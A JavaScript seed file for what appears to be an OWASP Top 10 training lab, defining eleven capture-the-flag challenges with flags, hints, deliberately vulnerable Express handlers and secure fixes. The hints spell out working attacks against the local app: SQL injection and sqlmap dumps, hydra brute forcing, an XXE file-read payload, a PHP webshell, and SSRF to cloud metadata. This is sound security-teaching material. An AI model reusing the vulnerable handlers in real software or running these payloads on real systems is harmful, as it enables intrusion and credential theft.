const initSqlJs = require('sql.js');
const fs = require('fs');
const path = require('path');

const DB_PATH = path.join(__dirname, 'owasp.db');

let db;

async function initDB() {
  const SQL = await initSqlJs();

  if (fs.existsSync(DB_PATH)) {
    const buffer = fs.readFileSync(DB_PATH);
    db = new SQL.Database(buffer);
  } else {
    db = new SQL.Database();
  }

  db.run(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      email TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL,
      role TEXT DEFAULT 'user',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS challenges (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL,
      description TEXT,
      category TEXT,
      difficulty TEXT,
      flag TEXT NOT NULL,
      hints TEXT,
      vulnerable_code TEXT,
      secure_code TEXT,
      order_num INTEGER
    );

    CREATE TABLE IF NOT EXISTS progress (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      challenge_id INTEGER NOT NULL,
      completed INTEGER DEFAULT 0,
      hints_used INTEGER DEFAULT 0,
      completed_at DATETIME,
      FOREIGN KEY (user_id) REFERENCES users(id),
      FOREIGN KEY (challenge_id) REFERENCES challenges(id),
      UNIQUE(user_id, challenge_id)
    );

    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,
      action TEXT,
      details TEXT,
      ip_address TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
  `);

  seedData();
  migrateData();
  saveDB();
  return db;
}

function saveDB() {
  const data = db.export();
  const buffer = Buffer.from(data);
  fs.writeFileSync(DB_PATH, buffer);
}

function seedData() {
  const count = db.exec("SELECT COUNT(*) as count FROM challenges");
  if (count.length > 0 && count[0].values[0][0] > 0) return;

  const challenges = [
    {
      name: 'Security Misconfiguration',
      description: 'The /api/debug endpoint leaks environment variables, database credentials, and cloud provider keys. Find and exploit the exposed AWS access key.',
      category: 'Misconfiguration',
      difficulty: 'Easy',
      flag: 'AKIAIOSFODNN7EXAMPLE',
      hints: JSON.stringify([
        'Directory busting: gobuster dir -u http://localhost:3001 -w common.txt',
        'Access GET http://localhost:3001/api/debug',
        'Look for AWS_ACCESS_KEY_ID in the environment variables'
      ]),
      vulnerable_code: `// VULNERABLE: Debug endpoint with no auth exposing .env
app.get('/api/debug', (req, res) => {
  res.json({
    env: process.env,
    db_schema: db.exec("SELECT sql FROM sqlite_master"),
    users: all('SELECT * FROM users'),
    server_uptime: process.uptime()
  });
});`,
      secure_code: `// SECURE: Remove debug endpoints or add auth + rate limiting
const isAdmin = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).send('Unauthorized');
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    if (decoded.role !== 'admin') return res.status(403).send('Forbidden');
    req.user = decoded;
    next();
  } catch { res.status(401).send('Invalid token'); }
};

// Only expose sanitized info in non-production with auth
if (process.env.NODE_ENV !== 'production') {
  app.get('/api/admin/debug', isAdmin, (req, res) => {
    const safeInfo = {
      uptime: process.uptime(),
      node_version: process.version,
      platform: process.platform
    };
    res.json(safeInfo);
  });
}`,
      order_num: 1
    },
    {
      name: 'Cryptographic Failures',
      description: 'The /api/debug endpoint returns the full users table including plaintext passwords. Extract another user\'s credentials to understand why plaintext storage is dangerous.',
      category: 'Cryptography',
      difficulty: 'Easy',
      flag: 'alice:LetMeIn!2024',
      hints: JSON.stringify([
        'Revisit the /api/debug endpoint - it dumps the users table',
        'Find Alice\'s password in the response',
        'Format: username:password'
      ]),
      vulnerable_code: `// VULNERABLE: Returns passwords in API response
app.get('/api/debug', (req, res) => {
  res.json({
    // ...
    users: db.prepare('SELECT id, username, email, password, role FROM users').all(),
    // ...
  });
});

// Also vulnerable: plaintext comparison in login
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const user = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password);
  if (!user) return res.status(401).send('Invalid credentials');
  const token = jwt.sign({ id: user.id, username: user.username }, JWT_SECRET);
  res.json({ token, user });
});`,
      secure_code: `// SECURE: Never return passwords, use bcrypt
const bcrypt = require('bcryptjs');

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
  if (!user || !(await bcrypt.compare(password, user.password))) {
    return res.status(401).send('Invalid credentials');
  }
  const token = jwt.sign({ id: user.id, username: user.username }, JWT_SECRET, { expiresIn: '24h' });
  res.json({ token, user: { id: user.id, username: user.username, email: user.email, role: user.role } });
});`,
      order_num: 2
    },
    {
      name: 'Broken Access Control (IDOR)',
      description: 'The /api/user/:id/notes endpoint has no access control. Access admin\'s notes to find their SSH private key.',
      category: 'Access Control',
      difficulty: 'Easy',
      flag: 'MHQCAQEEIIm3V+wYzIM6Trds4Rv5fGRpYq4nlcGmhqM3iDk9kWhLoAcGBSuBBAAi',
      hints: JSON.stringify([
        'curl http://localhost:3001/api/user/1/notes',
        'Change the user ID to access other users\' data',
        'Admin user (ID 1) has an SSH private key stored in their notes'
      ]),
      vulnerable_code: `// VULNERABLE: No ownership check
app.get('/api/user/:id', (req, res) => {
  const user = db.prepare('SELECT id, username, email, role, password FROM users WHERE id = ?').get(req.params.id);
  if (!user) return res.status(404).send('User not found');
  res.json(user);
});

app.get('/api/user/:id/notes', (req, res) => {
  const notes = db.prepare('SELECT * FROM notes WHERE user_id = ?').all(req.params.id);
  res.json(notes);
});`,
      secure_code: `// SECURE: Verify ownership via JWT middleware
const authenticate = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).send('Unauthorized');
  try {
    req.user = jwt.verify(token, JWT_SECRET);
    next();
  } catch { res.status(401).send('Invalid token'); }
};

app.get('/api/user/:id', authenticate, (req, res) => {
  if (req.user.id !== parseInt(req.params.id) && req.user.role !== 'admin') {
    return res.status(403).send('Access denied');
  }
  const user = db.prepare('SELECT id, username, email, role FROM users WHERE id = ?').get(req.params.id);
  if (!user) return res.status(404).send('User not found');
  res.json(user);
});`,
      order_num: 3
    },
    {
      name: 'Identification & Authentication Failures',
      description: 'The login endpoint has no rate limiting and accepts weak passwords. Brute force the admin account using a password list to find the correct password.',
      category: 'Authentication',
      difficulty: 'Medium',
      flag: 'P@ssw0rd!2024',
      hints: JSON.stringify([
        'hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 3001 http-post-form "/api/login:{\\"username\\":\\"admin\\",\\"password\\":\\"^PASS^\\"}:Invalid"',
        'Try common passwords: admin, password, 123456, admin123, P@ssw0rd!2024',
        'Use ffuf: ffuf -w passwords.txt -X POST -H "Content-Type: application/json" -d "{\\"username\\":\\"admin\\",\\"password\\":\\"FUZZ\\"}" -u http://localhost:3001/api/login -fc 401'
      ]),
      vulnerable_code: `// VULNERABLE: No rate limiting, no lockout
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  // No rate limiting - unlimited attempts
  // No account lockout after failures
  // No password complexity requirements

  const user = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  res.json({ token: jwt.sign({ id: user.id, username: user.username, role: user.role }, JWT_SECRET), user });
});`,
      secure_code: `// SECURE: Rate limiting + account lockout
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many attempts, try again later'
});

app.post('/api/login', loginLimiter, async (req, res) => {
  const { username, password } = req.body;
  const account = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
  if (!account) return res.status(401).send('Invalid credentials');
  if (account.locked_until && new Date(account.locked_until) > new Date()) {
    return res.status(423).json({ error: 'Account locked. Try again later.' });
  }
  const valid = await bcrypt.compare(password, account.password);
  if (!valid) {
    db.prepare('UPDATE users SET failed_attempts = failed_attempts + 1 WHERE username = ?').run(username);
    if (account.failed_attempts >= 4) {
      db.prepare('UPDATE users SET locked_until = ? WHERE username = ?').run(
        new Date(Date.now() + 15 * 60 * 1000).toISOString(), username
      );
    }
    return res.status(401).send('Invalid credentials');
  }
  db.prepare('UPDATE users SET failed_attempts = 0, locked_until = NULL WHERE username = ?').run(username);
  const token = jwt.sign({ id: account.id, username }, JWT_SECRET, { expiresIn: '24h' });
  res.json({ token, user: { id: account.id, username: account.username } });
});`,
      order_num: 4
    },
    {
      name: 'SQL Injection',
      description: 'The search endpoint concatenates user input directly into SQL queries. Exploit it to extract credit card numbers from the credit_cards table.',
      category: 'Injection',
      difficulty: 'Medium',
      flag: '4532015112830366',
      hints: JSON.stringify([
      "sqlmap -u 'http://localhost:3001/api/search?q=test' --batch --dump -T credit_cards",
      "Manual: ' UNION SELECT id, card_number, expiry, cvv FROM credit_cards --",
      "The credit_cards table contains 3 columns: id, card_number, expiry"
      ]),
      vulnerable_code: `// VULNERABLE: Direct string concatenation in SQL
app.get('/api/search', (req, res) => {
  const query = req.query.q;

  // VULNERABLE: Direct interpolation
  const sql = "SELECT id, name, price, description FROM products WHERE name LIKE '%" + query + "%' OR description LIKE '%" + query + "%'";

  try {
    const results = db.prepare(sql).all();
    res.json(results);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});`,
      secure_code: `// SECURE: Parameterized queries
app.get('/api/search', (req, res) => {
  const query = req.query.q;
  const results = db.prepare('SELECT id, name, price, description FROM products WHERE name LIKE ? OR description LIKE ?').all('%' + query + '%', '%' + query + '%');
  res.json(results);
});`,
      order_num: 5
    },
    {
      name: 'Insecure Design',
      description: 'The transfer endpoint has no server-side amount validation or ownership checks. Exploit this by sending a negative amount to drain the admin account.',
      category: 'Design Flaw',
      difficulty: 'Medium',
      flag: '$999999.99',
      hints: JSON.stringify([
        'curl -X POST http://localhost:3001/api/transfer -H "Content-Type: application/json" -d \'{"fromAccount":"ACC-001","toAccount":"ACC-002","amount":-999999.99}\'',
        'Try negative amounts - the server doesn\'t validate them',
        'No CSRF protection - you can craft cross-site requests'
      ]),
      vulnerable_code: `// VULNERABLE: No server-side validation, no CSRF
app.post('/api/transfer', (req, res) => {
  const { fromAccount, toAccount, amount } = req.body;

  // No CSRF token check
  // No ownership verification
  // No server-side amount validation
  // No balance check

  db.prepare('UPDATE accounts SET balance = balance - ? WHERE account_number = ?').run(amount, fromAccount);
  db.prepare('UPDATE accounts SET balance = balance + ? WHERE account_number = ?').run(amount, toAccount);

  const updated = db.prepare('SELECT * FROM accounts WHERE account_number = ?').get(fromAccount);
  res.json({ success: true, fromBalance: updated.balance });
});`,
      secure_code: `// SECURE: Server-side validation + CSRF + ownership
app.post('/api/transfer', authenticate, (req, res) => {
  const { toAccount, amount } = req.body;
  const userAccount = db.prepare('SELECT * FROM accounts WHERE user_id = ?').get(req.user.id);
  if (!userAccount) return res.status(400).send('No account found');
  const parsedAmount = parseFloat(amount);
  if (isNaN(parsedAmount) || parsedAmount <= 0) return res.status(400).send('Invalid amount');
  if (userAccount.balance < parsedAmount) return res.status(400).send('Insufficient funds');
  db.prepare('UPDATE accounts SET balance = balance - ? WHERE user_id = ?').run(parsedAmount, req.user.id);
  db.prepare('UPDATE accounts SET balance = balance + ? WHERE account_number = ?').run(parsedAmount, toAccount);
  res.json({ success: true, balance: userAccount.balance - parsedAmount });
});`,
      order_num: 6
    },
    {
      name: 'Vulnerable & Outdated Components (XXE)',
      description: 'The XML parser at /api/parse has no external entity restrictions. Use XXE to read the server\'s AWS credentials file and extract the secret access key.',
      category: 'Components',
      difficulty: 'Hard',
      flag: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
      hints: JSON.stringify([
      "curl -X POST http://localhost:3001/api/parse -H 'Content-Type: application/json' -d '{\"xml\":\"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///home/ubuntu/.aws/credentials\\\">]><data>&xxe;</data>\"}'",
        'Try reading ~/.aws/credentials, /etc/passwd, or the app source code',
        'Cloud credentials files contain aws_access_key_id and aws_secret_access_key'
      ]),
      vulnerable_code: `// VULNERABLE: Old XML parser with XXE vulnerability
const libxml = require('libxmljs');

app.post('/api/parse', (req, res) => {
  const xmlData = req.body.xml;
  const xmlDoc = libxml.parseXml(xmlData, { noent: true, nocdata: true });
  const result = xmlDoc.get('//data').text();
  res.json({ parsed: result });
});`,
      secure_code: `// SECURE: Use secure parser + disable DTDs
const { XMLParser } = require('fast-xml-parser');
const parser = new XMLParser({
  preventEntityExpansion: true,
  processEntities: false,
  allowBooleanAttributes: false
});

app.post('/api/parse', (req, res) => {
  try {
    const xmlData = req.body.xml;
    if (xmlData.includes('<!DOCTYPE') || xmlData.includes('<!ENTITY')) {
      return res.status(400).send('Invalid XML content');
    }
    const result = parser.parse(xmlData);
    res.json({ parsed: result });
  } catch (err) {
    res.status(400).send('Invalid XML');
  }
});`,
      order_num: 7
    },
    {
      name: 'Software & Data Integrity Failures',
      description: 'The file upload endpoint has no validation. Upload a PHP webshell and access it to execute system commands on the server.',
      category: 'Integrity',
      difficulty: 'Hard',
      flag: '<?php system($_GET["cmd"]); ?>',
      hints: JSON.stringify([
        'echo \'<?php system($_GET["cmd"]); ?>\' > shell.php',
        'curl -X POST http://localhost:3001/api/upload -F "file=@shell.php"',
        'Access the uploaded file at http://localhost:3001/uploads/shell.php?cmd=id'
      ]),
      vulnerable_code: `// VULNERABLE: No integrity checks on upload
const upload = multer({ dest: 'uploads/' });

app.post('/api/upload', upload.single('file'), (req, res) => {
  const targetPath = path.join(__dirname, 'uploads', req.file.originalname);
  fs.renameSync(req.file.path, targetPath);
  res.json({
    url: '/uploads/' + req.file.originalname,
    name: req.file.originalname,
    size: req.file.size
  });
});`,
      secure_code: `// SECURE: Validate file type, size, and content
const crypto = require('crypto');
const ALLOWED_TYPES = ['image/jpeg', 'image/png'];
const MAX_SIZE = 5 * 1024 * 1024;

const storage = multer.diskStorage({
  destination: 'uploads/',
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();
    if (!['.jpg','.jpeg','.png'].includes(ext)) return cb(new Error('Invalid extension'));
    cb(null, crypto.randomBytes(16).toString('hex') + ext);
  }
});
const upload = multer({ storage, limits: { fileSize: MAX_SIZE },
  fileFilter: (req, file, cb) => {
    if (!ALLOWED_TYPES.includes(file.mimetype)) cb(new Error('Invalid type'), false);
    cb(null, true);
  }
});`,
      order_num: 8
    },
    {
      name: 'Security Logging & Monitoring Failures',
      description: 'The application logs sensitive data including credit card numbers in plaintext. Check the logs endpoint to find exposed PII.',
      category: 'Logging',
      difficulty: 'Hard',
      flag: '4111111111111111',
      hints: JSON.stringify([
        'curl http://localhost:3001/api/logs',
        'Look for credit card numbers logged in plaintext',
        'Payment processing events log full card data without masking'
      ]),
      vulnerable_code: `// VULNERABLE: Logging sensitive data in plaintext
const logAction = (action, details) => {
  fs.appendFileSync('audit.log', JSON.stringify({
    action, details,  // Logs passwords, credit cards
    timestamp: new Date().toISOString()
  }) + '\\n');
};

app.post('/api/log-action', (req, res) => {
  const { action, details } = req.body;
  logAction(action, details);  // Logs whatever client sends
  res.json({ success: true });
});`,
      secure_code: `// SECURE: Sanitize logs before writing
const sanitize = (data) => {
  const str = JSON.stringify(data);
  return str.replace(/\\b\\d{16}\\b/g, '****-****-****-****')  // Mask CC numbers
            .replace(/"password":"[^"]+"/g, '"password":"***"');  // Mask passwords
};

const logAction = (action, details) => {
  fs.appendFileSync('audit.log', JSON.stringify({
    action,
    details: sanitize(details),
    timestamp: new Date().toISOString()
  }) + '\\n');
};`,
      order_num: 9
    },
    {
      name: 'Server-Side Request Forgery (SSRF)',
      description: 'The /api/fetch endpoint proxies requests to any URL. Use it to access the AWS EC2 metadata service and retrieve the instance ID.',
      category: 'SSRF',
      difficulty: 'Hard',
      flag: 'ami-0c55b159cbfafe1f0',
      hints: JSON.stringify([
      "curl 'http://localhost:3001/api/fetch?url=http://169.254.169.254/latest/meta-data/instance-id'",
        'Try accessing internal services like http://localhost:3001',
        'Cloud metadata is at 169.254.169.254 - the link-local address'
      ]),
      vulnerable_code: `// VULNERABLE: SSRF - no URL validation
app.get('/api/fetch', (req, res) => {
  const targetUrl = req.query.url;
  http.get(targetUrl, (response) => {
    let data = '';
    response.on('data', (chunk) => data += chunk);
    response.on('end', () => res.json({ url: targetUrl, status: response.statusCode, data: data.substring(0, 2000) }));
  }).on('error', (err) => res.json({ error: err.message }));
});`,
      secure_code: `// SECURE: Validate and restrict URLs
const ALLOWED_DOMAINS = ['api.example.com', 'data.example.com'];
const BLOCKED_IPS = ['127.0.0.1', '::1', '10.', '172.16.', '192.168.', '169.254.'];

app.get('/api/fetch', authenticate, async (req, res) => {
  const targetUrl = req.query.url;
  try {
    const parsed = new URL(targetUrl);
    if (!['http:', 'https:'].includes(parsed.protocol)) return res.status(400).send('Invalid protocol');
    if (!ALLOWED_DOMAINS.includes(parsed.hostname)) return res.status(403).send('Domain not allowed');
    const response = await fetch(targetUrl, { timeout: 5000 });
    res.json({ status: response.status, data: await response.text() });
  } catch (err) {
    res.status(400).json({ error: 'Invalid or blocked URL' });
  }
});`,
      order_num: 10
    },
    {
      name: 'Expert Challenge: The Full Chain',
      description: 'Chain 3 vulnerabilities to access the internal vault: Step 1 - Use IDOR to find the service key in admin notes. Step 2 - Use the key to authenticate with the service discovery endpoint (insecure design trusts client-provided secrets). Step 3 - Use SSRF to access the internal vault URL discovered in step 2.',
      category: 'Multi-Vuln Chain',
      difficulty: 'Expert',
      flag: 'VAULT_SECRET_a1b2c3d4e5',
      hints: JSON.stringify([
        'Step 1: curl http://localhost:3001/api/user/1/notes - find the service key',
        'Step 2: curl -X POST http://localhost:3001/api/verify-service -H "Content-Type: application/json" -d \'{"key":"svc-key-expert-789"}\'',
        'Step 3: Use the internal endpoint from step 2 with SSRF: curl "http://localhost:3001/api/fetch?url=http://localhost:3001/api/internal/vault"'
      ]),
      vulnerable_code: `// CHAIN: IDOR leaks service key → Insecure service verifier → SSRF to vault

app.post('/api/verify-service', (req, res) => {
  const { key } = req.body;
  if (key === 'svc-key-expert-789') {
    res.json({ authenticated: true, internal_endpoint: 'http://localhost:3001/internal/vault' });
  } else {
    res.status(401).json({ error: 'Invalid key. Hint: check admin notes' });
  }
});

app.get('/api/internal/vault', (req, res) => {
  res.json({ secret: 'VAULT_SECRET_a1b2c3d4e5', message: 'You chained all 3 vulnerabilities!' });
});`,
      secure_code: `// SECURE: Proper access control + server-side verification + URL allowlist
const authenticate = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  try { req.user = jwt.verify(token, JWT_SECRET); next(); }
  catch { res.status(401).json({ error: 'Invalid token' }); }
};

app.post('/api/verify-service', authenticate, (req, res) => {
  const key = get('SELECT value FROM secrets WHERE name = ?', ['service_key']);
  if (key?.value === req.body.key) {
    res.json({ authenticated: true, internal_endpoint: 'http://vault.internal:9000' });
  } else {
    res.status(401).json({ error: 'Invalid key' });
  }
});`,
      order_num: 11
    }
  ];

  const insert = db.prepare(`INSERT INTO challenges (name, description, category, difficulty, flag, hints, vulnerable_code, secure_code, order_num)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`);

  for (const c of challenges) {
    insert.run([c.name, c.description, c.category, c.difficulty, c.flag, c.hints, c.vulnerable_code, c.secure_code, c.order_num]);
  }

  // Seed users with realistic passwords
  db.run(`INSERT OR IGNORE INTO users (username, email, password, role) VALUES
    ('admin', 'admin@vulnforge.local', 'P@ssw0rd!2024', 'admin'),
    ('alice', 'alice@vulnforge.local', 'LetMeIn!2024', 'user'),
    ('bob', 'bob@vulnforge.local', 'Summer2024!', 'user'),
    ('charlie', 'charlie@vulnforge.local', 'Welcome1!', 'user')
  `);

  // Seed notes for IDOR - realistic sensitive data
  db.run(`CREATE TABLE IF NOT EXISTS notes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    title TEXT,
    content TEXT
  )`);
  db.run(`INSERT OR IGNORE INTO notes (id, user_id, title, content) VALUES
    (1, 1, 'SSH Private Key', '-----BEGIN EC PRIVATE KEY-----\nMHQCAQEEIIm3V+wYzIM6Trds4Rv5fGRpYq4nlcGmhqM3iDk9kWhLoAcGBSuBBAAi\noWQCaAGE4c2sQJA1tG4l2G8I7mGgH4yS7jJn8XRkGmH5x5d/uIvSv1aq5B1QCxJq\nF0Y5/JD/V3Mulrq4g7JGmH5x5d/uIvSv1aq5B1QCxJqF0Y5/JD/V3Mulrq4g7JA==\n-----END EC PRIVATE KEY-----'),
    (2, 1, 'AWS Credentials', '[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'),
    (3, 1, 'Service Account', 'Service key: svc-key-expert-789'),
    (4, 2, 'Password Reminder', 'My password: LetMeIn!2024'),
    (5, 3, 'Server List', 'Prod: 10.0.1.50, Staging: 10.0.1.51, Dev: 10.0.1.52'),
    (6, 4, 'Personal Notes', 'Remember to rotate API keys monthly')
  `);

  // Seed accounts for Insecure Design
  db.run(`CREATE TABLE IF NOT EXISTS accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    account_number TEXT UNIQUE NOT NULL,
    balance REAL DEFAULT 1000
  )`);
  db.run(`INSERT OR IGNORE INTO accounts (id, user_id, account_number, balance) VALUES
    (1, 1, 'ACC-001', 50000),
    (2, 2, 'ACC-002', 2500),
    (3, 3, 'ACC-003', 1500),
    (4, 4, 'ACC-004', 3200)
  `);

  // Seed credit_cards for SQLi
  db.run(`CREATE TABLE IF NOT EXISTS credit_cards (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    card_number TEXT NOT NULL,
    expiry TEXT,
    cvv TEXT,
    holder_name TEXT
  )`);
  db.run(`INSERT OR IGNORE INTO credit_cards (id, card_number, expiry, cvv, holder_name) VALUES
    (1, '4532015112830366', '08/27', '123', 'John Smith'),
    (2, '4916123456789012', '11/26', '456', 'Alice Johnson'),
    (3, '4556123456789012', '03/28', '789', 'Bob Williams'),
    (4, '4111111111111111', '12/25', '321', 'Charlie Brown')
  `);

  // Seed secrets table (kept for legacy)
  db.run(`CREATE TABLE IF NOT EXISTS secrets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    value TEXT
  )`);
  db.run(`INSERT OR IGNORE INTO secrets (id, name, value) VALUES
    (1, 'db_password', 'S3cur3D4t4b4s3!'),
    (2, 'api_key', 'sk-vulnforge-prod-key-789'),
    (3, 'service_key', 'svc-key-expert-789')
  `);

  // Seed products
  db.run(`CREATE TABLE IF NOT EXISTS products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    price REAL,
    description TEXT
  )`);
  db.run(`INSERT OR IGNORE INTO products (id, name, price, description) VALUES
    (1, 'Laptop', 999.99, 'High performance laptop'),
    (2, 'Mouse', 29.99, 'Wireless mouse'),
    (3, 'Keyboard', 89.99, 'Mechanical keyboard')
  `);

  // Seed realistic shadow file for XXE challenge
  const shadowPath = path.join(__dirname, 'shadow.txt');
  if (!fs.existsSync(shadowPath)) {
    fs.writeFileSync(shadowPath, 'root:$y$j9T$JD/V3Mulrq4g7JGmH5x5d/uIvSv1aq5B1QCxJqF0Y5/:18937:0:99999:7:::\ndaemon:*:18937:0:99999:7:::\nbin:*:18937:0:99999:7:::');
  }

  // Seed /etc/passwd for XXE
  const passwdPath = path.join(__dirname, 'passwd.txt');
  if (!fs.existsSync(passwdPath)) {
    fs.writeFileSync(passwdPath, 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nadmin:x:1000:1000:Admin User:/home/admin:/bin/bash');
  }

  // Seed AWS credentials file for XXE
  const awsCredsPath = path.join(__dirname, 'aws_creds.txt');
  if (!fs.existsSync(awsCredsPath)) {
    fs.writeFileSync(awsCredsPath, '[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nregion = us-east-1');
  }

  // Seed flag.txt with EC2 instance ID for SSRF challenge
  const flagTxtPath = path.join(__dirname, 'flag.txt');
  if (!fs.existsSync(flagTxtPath)) {
    fs.writeFileSync(flagTxtPath, 'ami-0c55b159cbfafe1f0');
  }

  // Seed realistic log data
  const logCount = db.exec("SELECT COUNT(*) as cnt FROM logs");
  if (logCount[0].values[0][0] === 0) {
    db.run(`INSERT INTO logs (action, details, created_at) VALUES
      ('login', '{"username":"admin","ip":"192.168.1.100","status":"success"}', datetime('now', '-2 hours')),
      ('payment', '{"card":"4111111111111111","amount":49.99,"merchant":"Amazon"}', datetime('now', '-1 hours')),
      ('login', '{"username":"alice","password":"LetMeIn!2024","ip":"10.0.0.5","status":"success"}', datetime('now', '-30 minutes')),
      ('transfer', '{"from":"ACC-001","to":"ACC-002","amount":500,"status":"completed"}', datetime('now', '-15 minutes')),
      ('payment', '{"card":"4532015112830366","amount":199.99,"merchant":"Apple Store"}', datetime('now', '-5 minutes')),
      ('login', '{"username":"admin","password":"wrongpass","ip":"45.33.32.156","status":"failed"}', datetime('now', '-1 minutes'))
    `);
  }
}

function migrateData() {
  // Legacy migration: add service key & secret for old DBs that predate the full seed
  const noteExists = db.exec("SELECT id FROM notes WHERE id = 3 AND title = 'Service Account'");
  if (noteExists.length === 0 || noteExists[0].values.length === 0) {
    db.run(`INSERT OR IGNORE INTO notes (user_id, title, content) VALUES (?, ?, ?)`, [1, 'Service Account', 'Service key: svc-key-expert-789']);
  }

  const svcSecretExists = db.exec("SELECT id FROM secrets WHERE name = 'service_key'");
  if (svcSecretExists.length === 0 || svcSecretExists[0].values.length === 0) {
    db.run(`INSERT OR IGNORE INTO secrets (name, value) VALUES (?, ?)`, ['service_key', 'svc-key-expert-789']);
  }

  saveDB();
}

module.exports = { initDB, saveDB, getDB: () => db };
